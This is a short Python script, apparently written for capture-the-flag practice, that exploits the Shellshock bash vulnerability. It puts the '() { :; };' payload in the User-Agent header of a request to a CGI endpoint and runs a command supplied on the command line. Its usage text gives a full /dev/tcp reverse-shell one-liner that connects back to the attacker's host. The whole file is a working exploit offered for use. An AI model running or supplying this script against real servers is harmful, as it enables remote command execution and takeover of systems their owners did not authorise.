#!/usr/bin/env python3

import requests
import sys

#its my own testing file just to solve CTFs. Please dont misuse it
print("""
Usage: shellshock.py http://exampleshellshock.com/cgi-bin/path "reverseshellinquotes"
example: shellshock.py http://exampleshellshock.com/cgi-bin/test "/bin/bash -i >& /dev/tcp/lhost/lport 0>&1"
""")


url = sys.argv[1]
payload = '() { :; }; /bin/sh -c '+ sys.argv[2]

headers ={
        "User-Agent": payload,
        "Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language" : "en-US,en;q=0.5",
        "Accept-Encoding" : "gzip, deflate, br",
        "Upgrade-Insecure-Requests" : "1"
}

result = requests.get(url, headers=headers)
print(result.text)
